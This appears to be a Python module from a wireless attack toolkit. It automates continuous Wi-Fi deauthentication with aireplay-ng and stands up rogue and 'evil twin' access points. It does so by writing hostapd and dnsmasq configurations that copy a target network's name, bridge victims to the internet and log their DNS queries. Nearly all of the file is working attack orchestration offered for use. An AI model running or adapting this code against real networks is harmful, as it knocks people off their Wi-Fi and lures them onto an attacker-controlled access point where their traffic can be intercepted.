import os
import time
import os
import signal
import subprocess
import time
import re
import keyboard
import glob
import subprocess

import Network
import main
from Network import clear, ansi_escape_red, ansi_escape_green

import threading
import subprocess

terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']


def run_command(command):
    """
     This command will execute in the main terminal and display both its input and output.
     It is intended for calling commands that do not require termination

    :param command:
    :return:
    """
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(f"Command: {command}")
    if result.returncode == 0:
        print(f"{ansi_escape_green('Output')}   :   " + result.stdout)
        print("-" * 30)
        return result.stdout
    else:
        print(f"{ansi_escape_red('Error')}      :   " + result.stderr)
        print("-" * 30)
        return result.stderr


def popen_command(command):
    """
    Similar to run_command(), but it returns the process, so we can terminate it if necessary. This can be used for a
    process that needs to be stopped after some time, like airodump-ng.
    """
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return process



def popen_command_new_terminal(command):
    """
    This function is used for commands that require simultaneous execution (designed for the evil twin attack). With
    this update, child terminals are not bound to the parent terminal, allowing us to see the stderr and stdout. If
    we were to use the old logic of creating child terminals, an error would cause the child terminal to close
    immediately, causing us to lose any output that could be useful for troubleshooting.

    Returns the PID of the subprocess if successful, otherwise returns None.
    """
    terminals = ['gnome-terminal', 'konsole', 'xfce4-terminal', 'x-terminal-emulator']  # Example terminal list
    for terminal in terminals:
        try:
            # Append 'exec bash' to keep the terminal open
            terminal_command = ""
            if terminal == 'gnome-terminal':
                terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'konsole':
                terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'xfce4-terminal':
                terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            else:
                terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            print(f"Executing command: {terminal_command}\n")

            # Start the subprocess and get its PID
            process = subprocess.Popen(terminal_command, shell=True, preexec_fn=os.setsid)

        except Exception as e:
            print(f"Failed to execute command in {terminal}: {e} \n")

    return process


def kill_process(process):
    if process:
        try:
            os.killpg(process.pid, signal.SIGTERM)
            print(f"Process ({ansi_escape_green(process)}) was terminated.")
        except Exception as e:
            return


def switch_interface_channel(interface, target_channel):
    command = f'iwconfig {interface} channel {target_channel}'
    process = popen_command(command)
    process.wait()
    print(f'{ansi_escape_green(interface)} set to channel {target_channel}')
    return


def aireplay_on_target_bssid(interface, channel, target_ap=None, target_bssid=None):
    if target_bssid and not target_ap:
        command = f'aireplay-ng --deauth 0 -a {target_bssid} {interface}'
        message_to_user = f'running aireplay on {ansi_escape_green(target_bssid)}'
    else:
        command = f'aireplay-ng --deauth 0 -e {target_ap} {interface}'
        message_to_user = f'running aireplay on {ansi_escape_green(target_ap)}'
    switch_interface_channel(interface, channel)
    popen_command_new_terminal(command)
    print(message_to_user)
    return


# def airbase_host_evil_twin(interface, channel, target_ap=None, target_bssid=None):
#     if target_bssid and not target_ap:
#         print('Functionality for BSSID without AP not implemented yet.')
#         return
#     else:
#         command = f'airbase-ng -e {target_ap} -c {channel} {interface}'
#         message_to_user = f'Running airbase-ng to host {ansi_escape_green(target_ap)} on a new interface'
#     popen_command_new_terminal(command)
#     print(message_to_user)
#     return


def hostapd(interface, internet_facing_interface, target_ap=None, channel=None, bridge=None):
    """

    :param interface:
    :param internet_facing_interface:
    :param target_ap:
    :param channel:
    :param bridge:
    :return: returns the bridge name to be used dnsmasq in clearing process. this bridge will be removed after evil_twin or rogue_ap
    """
    print(f'Creating {ansi_escape_green("hostapd")} config file')
    if not bridge:
        bridge = input(f'Select a name for bridge {ansi_escape_green("(default = roguebr)")} : ')
        if bridge == "":
            bridge = 'roguebr'
    clear()
    print(f'Creating/Configuring Bridge : {ansi_escape_green(bridge)}\n')
    run_command(f'brctl addbr {bridge}')
    run_command(f'brctl addif {bridge} {internet_facing_interface}')
    bring_interface_up(bridge)
    bring_interface_up(internet_facing_interface)

    if not target_ap:
        target_ap = input(f'Select a name for the Network {ansi_escape_green("(default = rogue)")} : ')
        if target_ap == "":
            target_ap = 'rogue'
            channel = '1'

    hostapd_conf_location = '/tmp/hostapd.conf'
    conf_file = [
        f'interface={interface}',
        f'driver=nl80211',
        f'bridge={bridge}',
        f'hw_mode=g',
        f'ssid={target_ap}',
        f'channel={channel}'
    ]
    with open(hostapd_conf_location, 'w') as hostapd_conf:
        for line in conf_file:
            hostapd_conf.write(line + "\n")
    print('hostapd.conf created at /tmp/hostapd.conf')
    print(f'Running {ansi_escape_green("hostapd")}')
    hostapd_process = popen_command_new_terminal(f'hostapd {hostapd_conf_location}')
    return bridge, hostapd_process


def dnsmasq(bridge):
    """
    with bridge information from

    :param bridge:
    :return:
    """
    dnsmasq_conf_location = '/tmp/dnsmasq.conf'
    conf_file = [f"interface={bridge}",
                 "dhcp-range=192.168.2.1,192.168.2.255,255.255.255.0,12h",
                 "dhcp-option=3,192.168.2.1",
                 "dhcp-option=6,192.168.2.1",
                 "server=8.8.8.8",
                 "server=8.8.4.4",
                 "log-queries",
                 "log-dhcp",
                 "cache-size=1000",
                 "listen-address=192.168.2.1"

                 ]
    with open(dnsmasq_conf_location, 'w') as dnsmasq_conf:
        for line in conf_file:
            dnsmasq_conf.write(line + "\n")
    print('dnsmasq.conf created at /tmp/dnsmasq.conf')
    print(f'Running dnsmasq with the config file on {ansi_escape_green(dnsmasq_conf_location)}')
    command = f'dnsmasq -C {dnsmasq_conf_location} -d'
    # restart to update dnsmasq with new configuration
    run_command('systemctl restart dnsmasq')
    popen_command_new_terminal(command)


def requirements():
    run_command('apt-get install dnsmasq -y')
    run_command('apt-get install hostapd -y')
    run_command('apt-get install apache2 -y')

def stop_network_manager():
    run_command('systemctl stop NetworkManager') # for kali
def restart_network_manager():
    run_command('systemctl restart NetworkManager') # for kali

def bring_interface_up(interface):
    stdout = run_command(f'ip link show {interface}')
    if 'DOWN' in stdout:
        stdout2 = run_command(f'ifconfig {interface} up')
        if stdout2:
            if 'Device or resource busy' in stdout2:
                process = popen_command('sudo systemctl stop NetworkManager')
                process.wait()
                run_command(f'ifconfig {interface} up')
def bring_interface_down(interface):
    stdout = run_command(f'ip link show {interface}')
    if 'up' in stdout:
        run_command(f'ifconfig {interface} down')


def rogue_ap(interface, internet_facing_interface, target_ap, called_from_evil_twin=False,bssid=None,channel=None):
    def rogue_ap_cleanup(bridge, hostapd_process):
        # cleanup dnsmasq
        run_command(f'ip link delete {bridge} type bridge')
        kill_process(hostapd_process)
        restart_network_manager()
        run_command('killall hostapd')

    bssid, channel = Network.get_BSSID_and_Station_from_AP(interface, target_ap)

    # NOT SURE IF THESE 3 BELOW ARE NECESSARY OR NOT
    stop_network_manager()
    bring_interface_down(interface)
    bring_interface_down(internet_facing_interface)

    bridge, hostapd_process = hostapd(interface, internet_facing_interface, target_ap=target_ap, channel=channel)
    if called_from_evil_twin:
        return bssid, channel, bridge, hostapd_process  # to be used in aireplay-ng in evil twin, and for cleanup process
    else:
        input(
            f'Press enter on this terminal to {ansi_escape_red("CLOSE")} the {ansi_escape_green("ROGUE AP")} and start cleanup process')
        return rogue_ap_cleanup(bridge, hostapd_process)


def evil_twin(interface, internet_facing_interface, target_ap):
    def evil_twin_cleanup(interface, internet_facing_interface, bridge, hostapd_process):
        def cleanup_dnsmasq_masquerade(interface):
            command = ['iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', interface, '-j', 'MASQUERADE']
            while True:
                try:
                    subprocess.check_call(command)
                    print(f"Removed a MASQUERADE rule for {interface}")
                except subprocess.CalledProcessError as e:
                    print(f"No more MASQUERADE rules for {interface} to remove.")
                    break
        # cleanup dnsmasq
        cleanup_dnsmasq_masquerade(interface)
        cleanup_dnsmasq_masquerade(internet_facing_interface)
        # remove bridge
        run_command(f'ip link delete {bridge} type bridge')
        # kill hostapd_process
        kill_process(hostapd_process)
        # bring network manager up
        restart_network_manager()
        # bring interface up
        bring_interface_up(interface)
        # kill hostapd
        run_command('killall hostapd')
        # this command 'killall hostapd' will solve this error on hostapd

        # nl80211: Could not configure driver mode
        # nl80211: deinit ifname=wlan0 disabled_11b_rates=0
        # nl80211 driver initialization failed.
        # wlan0: interface state UNINITIALIZED->DISABLED
        # wlan0: AP-DISABLED
        # wlan0: CTRL-EVENT-TERMINATING
        # hostapd_free_hapd_data: Interface wlan0 wasn't started

        # disable ip forwarding
        run_command('echo 0 > /proc/sys/net/ipv4/ip_forward')

    # enable ip forwarding
    run_command('echo 1 > /proc/sys/net/ipv4/ip_forward')
    bssid, channel, bridge, hostapd_process = rogue_ap(interface, internet_facing_interface, target_ap,
                                                       called_from_evil_twin=True)
    # aireplay_on_target_bssid(interface, channel, target_ap=target_ap, target_bssid=bssid)
    input(f'press enter to close the evil twin | cleanup network rules {ansi_escape_red("!! WAIT UNTIL CLEANUP ENDS")}')
    evil_twin_cleanup(interface, internet_facing_interface, bridge, hostapd_process)


# def arp_spoof(interface):
#     return



